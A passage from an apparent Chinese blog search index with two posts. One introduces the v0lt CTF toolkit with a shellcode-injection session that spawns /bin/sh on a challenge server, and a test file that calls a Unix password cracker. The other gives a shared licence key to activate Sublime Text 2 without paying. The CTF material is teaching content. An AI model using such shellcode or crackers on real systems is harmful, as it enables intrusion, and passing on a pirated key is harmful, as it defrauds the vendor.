class="line"><span class="meta">&gt;&gt;&gt; </span>nc = Netcat(<span class="string">"archpichu.ddns.net"</span>, <span class="number">65102</span>)</div><div class="line">Connected to port <span class="number">65102</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(nc.read())</div><div class="line">GIVE ME SHELLCODZ</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>shellhack = ShellHack(<span class="number">4096</span>, <span class="string">"bin"</span>,<span class="string">"execve"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>shellhack.get_shellcodes(shellhack.keywords)</div><div class="line">    </div><div class="line">...&lt;SNIPPED&gt;...</div><div class="line"><span class="number">85</span>: Linux/x86:setuid(<span class="number">0</span>) &amp; execve(/sbin/poweroff -f) - <span class="number">47</span> bytes</div><div class="line"><span class="number">86</span>: Linux/x86:execve (/bin/sh) - <span class="number">21</span> Bytes</div><div class="line"><span class="number">87</span>: Linux/x86:<span class="keyword">break</span> chroot execve /bin/sh - <span class="number">80</span> bytes</div><div class="line"><span class="number">88</span>: Linux/x86:execve(/bin/sh,<span class="number">0</span>,<span class="number">0</span>) - <span class="number">21</span> bytes</div><div class="line">...&lt;SNIPPED&gt;...</div><div class="line">    </div><div class="line">Selection: <span class="number">86</span></div><div class="line">Your choice: http://shell-storm.org/shellcode/files/shellcode<span class="number">-752.</span>php</div><div class="line">Shellcode: <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62[...]"</span></div><div class="line">    </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>nc.shellcat(shellhack.shellcode)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>nc.writeln(shellhack.pad())</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>exploit = nc.dialogue(<span class="string">"cat flag"</span>, <span class="number">3</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(exploit)</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:</div><div class="line">File name too long</div><div class="line">P1kaCTF&#123;sh3llc0de_1s_e4zY&#125;</div></pre></td></tr></table></figure><p></p><h1 id="实现功能"><a href="#实现功能" class="headerlink" title="实现功能:"></a>实现功能:</h1><p><strong>加密</strong></p><ul><li>Base64</li><li>凯撒移位</li><li>哈希功能(SHA, MD5)</li><li>位运算(XOR, 反向XOR)</li><li>常用转换(bytes, strings, hex)</li><li>RSA基础模块 (逆模, 逆幂, 实现RSA共模攻击的egcd脚本…)</li><li>暴力破解(基于字典, 自定义词)</li></ul><p><strong>Shellcodes</strong></p><ul><li>从Jonathan Salwan的个人网站Shell-storm选定Shellcode并用repo工具下载</li><li>Shellcode格式</li><li>Shell{cat,net}: 轻松发送Shellcode</li><li>自动填充</li></ul><p><strong>连接支持</strong></p><ul><li>Netcat</li><li>Telnet</li></ul><p><strong>更多可获得的实例:</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> unittest</div><div class="line">    </div><div class="line"><span class="keyword">from</span> v0lt <span class="keyword">import</span> *</div><div class="line">    </div><div class="line">__author__ = <span class="string">'P1kachu'</span></div><div class="line">    </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span><span class="params">(unittest.TestCase)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_netcat</span><span class="params">(self)</span>:</span></div><div class="line">        nc = Netcat(<span class="string">"archpichu.ddns.net"</span>, <span class="number">65103</span>)</div><div class="line">        self.assertEqual(nc.read(), <span class="string">"\nNothing to display yet...\n"</span>)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_telnet</span><span class="params">(self)</span>:</span></div><div class="line">        tl = Telnet(<span class="string">"archpichu.ddns.net"</span>, <span class="number">65103</span>)</div><div class="line">        self.assertEqual(tl.read(), <span class="string">"\nNothing to display yet...\n"</span>)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_stack</span><span class="params">(self)</span>:</span></div><div class="line">        stack = Stack()</div><div class="line">        self.assertEqual(stack.size(), <span class="number">0</span>)</div><div class="line">        stack.push(<span class="string">"item"</span>)</div><div class="line">        self.assertEqual(stack.is_empty(), <span class="keyword">False</span>)</div><div class="line">        self.assertEqual(stack.size(), <span class="number">1</span>)</div><div class="line">        item = stack.pop()</div><div class="line">        self.assertEqual(stack.size(), <span class="number">0</span>)</div><div class="line">        self.assertEqual(item, <span class="string">"item"</span>)</div><div class="line">        self.assertEqual(stack.is_empty(), <span class="keyword">True</span>)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_basic_ceasar</span><span class="params">(self)</span>:</span></div><div class="line">        plaintext = <span class="string">"This is a ceasar plaintext"</span></div><div class="line">        encrypted = <span class="string">"GUVF VF N PRNFNE CYNVAGRKG"</span></div><div class="line">        deciphered = basic_ceasar(plaintext, offset=<span class="number">13</span>)</div><div class="line">        self.assertEqual(encrypted, deciphered)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_get_shellcode</span><span class="params">(self)</span>:</span></div><div class="line">        sh = ShellHack(<span class="number">70</span>, <span class="string">"/bin/lol"</span>)</div><div class="line">            sh.get_shellcodes(sh.keywords)</div><div class="line">        sh = ShellHack(<span class="number">70</span>, <span class="string">"/bin/sh"</span>)</div><div class="line">        sh.get_shellcodes(sh.keywords)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_flag_gen</span><span class="params">(self)</span>:</span></div><div class="line">        flags_gen(<span class="string">"flags.tmp"</span>, <span class="string">"P1ka"</span>, <span class="number">10</span>)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_find_nth</span><span class="params">(self)</span>:</span></div><div class="line">        self.assertEqual(find_nth(<span class="string">"lolilol"</span>, <span class="string">"l"</span>, <span class="number">3</span>), <span class="number">6</span>)</div><div class="line">        self.assertEqual(find_nth(<span class="string">"lolilol"</span>, <span class="string">"l"</span>, <span class="number">4</span>), <span class="number">-1</span>)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">(self)</span>:</span></div><div class="line">        bf = Bruteforce(charset=<span class="string">"abcd"</span>, final_length=<span class="number">5</span>, begin_with=<span class="string">"l"</span>, end_with=<span class="string">"P"</span>)</div><div class="line">        bf.generate_strings()</div><div class="line">        bf = Bruteforce(charset=<span class="string">"abcdef"</span>, final_length=<span class="number">12</span>, begin_with=<span class="string">"l"</span>, end_with=<span class="string">"P"</span>)</div><div class="line">        bf.generate_strings(output=<span class="string">"bf.tmp"</span>)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_hex</span><span class="params">(self)</span>:</span></div><div class="line">        he = Hexeditor()</div><div class="line">        he.dump_file(<span class="string">"setup.py"</span>)</div><div class="line">        he.save_file_as_hex(<span class="string">"save.tmp"</span>)</div><div class="line">        he.restore_file(<span class="string">"test1.tmp"</span>)</div><div class="line">        he.restore_file(<span class="string">"test2.tmp"</span>, <span class="string">"save.tmp"</span>)</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_passwd_cracker</span><span class="params">(self)</span>:</span></div><div class="line">        nix_basic_pass_cracker(<span class="string">"HX9LLTdc/jiDE"</span>)</div><div class="line">        nix_basic_pass_cracker(<span class="string">"HX8LLTdc/jiDE"</span>)</div><div class="line">        <span class="comment"># nix_basic_pass_cracker("$1$khkWa1Nz$7YcmdOO1/uyHhMB7ga2L.1")</span></div><div class="line">        <span class="comment"># nix_basic_pass_cracker("$5$khkWa1Nz$583CsGZkoT82wh2ukf75KT4VVrf9ZO/P0FXLiPKgG//")</span></div><div class="line">        <span class="comment"># nix_basic_pass_cracker("$6$P1$XKg/SKZpe8Gbl5Utt3XVJEA4zJ6KB.IuZlShnP2FljfF32z3zoytnB.MaP9dJOObSOtiidHmeBp.feOqK4Mvg/")</span></div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    suite = unittest.defaultTestLoader.loadTestsFromTestCase(Tests)</div><div class="line">    unittest.TextTestRunner().run(suite)</div></pre></td></tr></table></figure><p></p><h2 id="0×02-变更记录"><a href="#0×02-变更记录" class="headerlink" title="0×02 变更记录"></a>0×02 变更记录</h2><p>只包括主要功能和变化。错误修正和次要的变化略。</p><p><strong>1.3 版本</strong></p><ul><li>再次做了许多修复</li><li>Hexeditor (转储/重写文件)</li><li>Unix密码暴力破解</li></ul><p><strong>1.2 版本</strong></p><ul><li>修改/修复/修正了许多文档/bugs/框架</li><li>增加了暴力破解模块</li><li>增加了linux下一些实用工具</li><li>增加了Hexeditor</li><li>Shellhack修复</li><li>增加了警报信息</li></ul><p><strong>1.0 版本</strong></p><ul><li>修改了许多文档</li><li>修复了许多bugs</li><li>增加了shellhack (shellcodes参照工具)</li><li>增加了加密工具</li><li>增加了网络方面工具</li><li>固定了项目树</li></ul><p>译者注:<br>项目作者：P1kachu<br>项目主页：<a href="https://github.com/P1kachu/v0lt" target="_blank" rel="external">https://github.com/P1kachu/v0lt</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> v0lt </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[最新Sublime Text 2 激活 汉化]]></title>
      <url>/2016/05/27/%E6%9C%80%E6%96%B0Sublime-Text-2-%E6%BF%80%E6%B4%BB-%E6%B1%89%E5%8C%96/</url>
      <content type="html"><![CDATA[<p><img src="http://www.hackfun.org/usr/uploads/2016/05/339778005.png" alt="1.png"></p><h2 id="0x00-Sublime-Text-2"><a href="#0x00-Sublime-Text-2" class="headerlink" title="0x00 Sublime Text 2"></a>0x00 Sublime Text 2</h2><p>Sublime Text 2 是一个轻量、简洁、高效、跨平台的编辑器，一直在使用它，简直是coder的必备神器，自从使用它之后就深深爱上它了(/▽＼=)，可能因为是它非常优秀的原因吧，所以开发者要求购买激活，其实表示很支持的，但是像我这种poor loser只能另想办法了(～￣▽￣)～*</p><a id="more"></a><h2 id="0x00-激活"><a href="#0x00-激活" class="headerlink" title="0x00 激活"></a>0x00 激活</h2><p>首先在<a href="http://www.sublimetext.com/2" target="_blank" rel="external">Sublime Text</a>官网下载最新的Sublime Text 2,官网提供各个系统对应版本的下载，针对Windows平台除了提供32位和64位对应版本，还提供了安装版和便携版的下载，个人觉得如果你不是深度系统纯净强迫症(虽然我也有一点)还是选择安装版，因为安装安装之后会右键集成打开相应代码文件，非常快捷方便，这里我下载的是Windows 64位安装版，其他的版本激活汉化也应该大同小异。</p><p><img src="http://www.hackfun.org/usr/uploads/2016/06/22050546.gif" alt="激活.gif"></p><p>这里再次谢谢dengmin提供LICENSE。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">----- BEGIN LICENSE ----- </div><div class="line">Andrew Weber </div><div class="line">Single User License </div><div class="line">EA7E-855605 </div><div class="line">813A03DD 5E4AD9E6 6C0EEB94 BC99798F </div><div class="line">942194A6 02396E98 E62C9979 4BB979FE </div><div class="line">91424C9D A45400BF F6747D88 2FB88078 </div><div class="line">90F5CC94 1CDC92DC 8457107A F151657B </div><div class="line">1D22E383 A997F016 42397640 33F41CFC </div><div class="line">E1D0AE85 A0BBD039 0E9C8D55 E1B89D5D </div><div class="line">5CDB7036 E56DE1C0 EFCC0840 650CD3A6 </div><div class="line">B98FC99C 8FAC73EE D2B95564 DF450523 </div><div class="line">------ END LICENSE ------</div></pre></td></tr></table></figure><p></p><h2 id="0x01-汉化"><a href="#0x01-汉化" class="headerlink" title="0x01 汉化"></a>0x01 汉化</h2><p>汉化包下载地址：<a href="https://github.com/AndorChen/sublime-locales" target="_blank" rel="external">https://github.com/AndorChen/sublime-locales</a><br>汉化过程如下：<br>1.下载 Locales；<br>2.打开 Sublime Text 2，选择左上角的「Sublime Text 2」-&gt;「Preferences」-&gt;「Browse Packages」，便会打开「Packages」文件夹，将下载下来的 Locales 压缩包解压缩到「Packages」文件夹内；<br>3.打开 Sublime Text 2，选择左上角的「Sublime Text 2」-&gt;「Preferences」-&gt;「Settings-User」，添加</p><pre><code>&quot;locales&quot;: &quot;zh-CN&quot;
</code></pre><p>配置并保存。</p><p><img src="http://www.hackfun.org/usr/uploads/2016/06/1556394236.gif" alt="汉化.gif"></p><p>看不清楚请<a href="http://www.hackfun.org/usr/uploads/2016/06/1556394236.gif" target="_blank" rel="external">查看大图</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sublime text 2 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
